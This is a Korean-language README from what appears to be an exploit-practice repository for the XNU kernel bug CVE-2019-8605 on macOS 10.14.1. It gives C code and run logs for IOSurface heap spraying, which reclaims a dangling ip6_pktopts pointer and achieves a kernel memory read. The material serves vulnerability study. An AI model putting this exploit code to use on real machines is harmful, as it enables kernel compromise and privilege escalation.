# **IOSurface_kread_observe (CVE-2019-8605)**

## 환경

macOS 10.14.1 x86_64 ([net.siguza.hsp4.kext](https://github.com/Siguza/hsp4/tree/master) 필요)

## 설명

이전에 작성한 [dangling_kptr_reuse](https://github.com/wh1te4ever/xnu_1day_practice/tree/main/CVE-2019-8605/dangling_kptr_reuse) 레포지토리와 비슷하지만 샬짝 다릅니다.

**해당 레포지토리는 IOSurface Heap Spraying 기법으로 커널 읽기를 수행하는데, 
여기서 dangling 포인터가 실제로 재사용되는지 확인하고, 
dangling 포인터에는 어떤 데이터가 담기게 되는지 알아봅니다.**

이전에, 상위 폴더의 레포지터리에 작성된 README 내용을 봤을 때,
[“2. OSUnserializeBinary 포맷을 활용한 IOSurface 풍수” 제목](https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2019-8605/README_ko.md#2-osunserializebinary-%ED%8F%AC%EB%A7%B7%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-iosurface-%ED%92%8D%EC%88%98)으로 
IOSurface에 풍수할 데이터가 어떻게 만들어지는지 알아봤습니다.

이렇게 풍수될 데이터는 `IOSurface_set_value` 함수에 의해 커널에 데이터가 적재됩니다.

커널에 적재된 데이터들을 확인하는 방법은 다음과 같습니다.

유저 영역에서 가져온 IOSurface를 초기화할때 가져온 mach_port를 가지고, 
커널 영역의 kobject에 접근하여 순차적으로 구조체 필드에 접근함으로써 
풍수된 dictionary부터 OSArray까지 접근할 수 있습니다.

socket_fd로부터 가져온 dangling 커널 포인터가 
풍수에 의해 적재된 OSArray에 있는 요소의 주소와 서로 일치하면
dangling 포인터가 재사용되었다는 것을 의미합니다.

임의로 8바이트 커널에 할당된 포인터에 `0xc0debabe13371338` 값을 kwrite64하고,
취약점을 이용하여 `rk64_via_uaf` 함수에 의해 읽어오는데, 
여기에 스프레이된 커널 데이터 중에서 댕글링 포인터가 실제로 재사용되는지 확인하기 위해 만들었습니다.

```c
// obtain userdict from IOSurface
//Thanks @jmpews, https://gist.github.com/jmpews/01b520993a742f72714cd06e40793eed
uint64_t userdict_from_IOSurface(void) {
	uint64_t surfRoot = port_to_kobject(IOSurfaceRootUserClient);
	// INFO("surfRoot: 0x%llx\n", surfRoot);

	// p/x offsetof(IOSurfaceRootUserClient, IOSurfaceClientArray) = 0x118;
	uint64_t surfClients = kread64(surfRoot + 0x118);
	// INFO("surfClients: 0x%llx\n", surfClients);

	uint64_t surfClient = kread64(surfClients + sizeof(uint64_t) * IOSurface_id);
	// INFO("surfClient: 0x%llx\n", surfClient);

	// p/x offsetof(IOSurfaceClient, IOSurface) = 0x40;
	uint64_t surface = kread64(surfClient + 0x40);
	// INFO("surface: 0x%llx\n", surface);

	// p/x offsetof(IOSurface, UserspaceValueDictionary) = 0xd0
	uint64_t userspaceValueDicts = kread64(surface + 0xd0);

	if(userspaceValueDicts != 0) return userspaceValueDicts;

	return 0;
}

bool is_our_sprayed_OSArray(uint64_t osarray) {
	uint32_t osarray_count = kread32(osarray + 0x20);	// 0x20 = p/x offsetof(OSArray, count)
	uint32_t osarray_capacity = kread32(osarray + 0x24);	// 0x24 = p/x offsetof(OSArray, capacity)
	
	if(osarray_count != 256)	return false;

	for(int i = 0; i < 256; i++) {
		uint64_t osdata_in_osarray = OSArray_objectAtIndex(osarray, i);
		uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
		if(kread64(kbuffer + offsetof(struct ip6_pktopts, ip6po_minmtu)) != 0x41424344) return false;

		//yes, it's our sprayed osarray!
		printf("our sprayed 192bytes OSArray[%d] = 0x%llx\n", i, kbuffer);

		for(int j = 0; j < sizeof(dangling_kptrs) / sizeof(uint64_t); j++) {
			if(kbuffer == dangling_kptrs[j]) {
				INFO("DANGLING KPTR REUSE DETECTED!!! OSArray[%d](0x%llx) == dangling_kptrs[%d](0x%llx)\n", i, kbuffer, j, dangling_kptrs[j]);
				khexdump(dangling_kptrs[j], 0xc0);
				break;
			}
		}
	}

	return true;
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
		dangling_kptrs[i] = get_dangling_ip6_pktopts_kaddr(sockets[i]);
    }
 
	for (int i = 0; i < 128; i++) {
        INFO("dangling_kptr = 0x%llx; obtained from socket_fd=%d\n", dangling_kptrs[i], sockets[i]);
    }
...
	uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("userspaceValueDicts: 0x%llx\n", userspaceValueDicts);

	struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);

	int sprayed_osarray_found_count = 0;
    for (int i = 0; i < dict->count; i++) {
		if(is_our_sprayed_OSArray(dict->items[i].value)) {
			INFO("sprayed OSArray from dict[%u]: 0x%llx\n\n", i, dict->items[i].value);
			sprayed_osarray_found_count++;
		}
  }
	INFO("sprayed_osarray_found_count = %d\n", sprayed_osarray_found_count);
... 
    return buf;
}
```

레포지토리에 있는 실제 코드를 실행시켜보면,
스프레이된 2번째 dict 중 OSArray[47]이 dangling된 `inp->in6p_outputopts` 주소를 가리키고 있었습니다.

dangling된 주소는 **0xffffff802c0d7280**입니다.

여기서 [**0xffffff802c0d7280**+0x010] 필드에 임의로 8바이트 할당된 커널 주소가 적혀있습니다.

0x10 오프셋 필드는 `struct ip6_pktopts`의 ip6po_pktinfo 필드에 속하기 때문에
`get_pktinfo` 함수로 해당 주소의 20바이트를 읽어올 수 있습니다.

```
ret: 0x0, hsp4: 0xb03
kext_name: com.apple.kec.corecrypto
kext_addr_slid: 0xffffff7f9dcc7000
get_kbase ret: 0, kbase: 0xffffff801ce00000, kslide: 0x1cc00000
[*] IOSurface_init success, IOSurface_id=0x3
[*] surfRoot: 0xffffff802c4280e0
[*] surfClients: 0xffffff802deb0000
[*] surfClient: 0xffffff802c092e60
[*] surface: 0xffffff802b4fbc00
[*] kptr = 0xffffff80b0dbb000 -> kread64: 0xc0debabe13371338
[*] dangling_kptr = 0xffffff802c0d7280; obtained from socket_fd=3
[*] dangling_kptr = 0xffffff802c0d7280; obtained from socket_fd=4
...
[*] spray_IOSurface_call_count: 1
[*] userspaceValueDicts: 0xffffff8029396680
[*] dict 0xffffff8029396680, items 0xffffff80290ca240, count 33, capacity 36
our sprayed 192bytes OSArray[0] = 0xffffff802c0d5b40
our sprayed 192bytes OSArray[1] = 0xffffff802c0d5180
...
[*] sprayed OSArray from dict[1]: 0xffffff80293966c0

our sprayed 192bytes OSArray[0] = 0xffffff802932c480
our sprayed 192bytes OSArray[1] = 0xffffff802bbe7640
our sprayed 192bytes OSArray[2] = 0xffffff802bbe7100
...
our sprayed 192bytes OSArray[47] = 0xffffff802c0d7280
[*] DANGLING KPTR REUSE DETECTED!!! OSArray[47](0xffffff802c0d7280) == dangling_kptrs[0](0xffffff802c0d7280)
=============================
[0xffffff802c0d7280+0x000] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
**[0xffffff802c0d7280+0x010] 00 B0 DB B0 80 FF FF FF**  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x020] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x030] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x040] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x050] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x060] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x070] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x080] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x090] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x0a0] 00 00 00 00 44 43 42 41  00 00 00 00 00 00 00 00  |  ....DCBA........ 
[0xffffff802c0d7280+0x0b0] 00 00 00 00 44 43 42 41  00 00 00 00 00 00 00 DE  |  ....DCBA........ 
=============================
our sprayed 192bytes OSArray[48] = 0xffffff802dc05600
...
our sprayed 192bytes OSArray[255] = 0xffffff802dc0c3c0
[*] sprayed OSArray from dict[2]: 0xffffff8029396a00

...
[*] sprayed OSArray from dict[32]: 0xffffff8029346f80

[*] sprayed_osarray_found_count = 32
[*] rk64_via_uaf(kptr) = 0xc0debabe13371338
```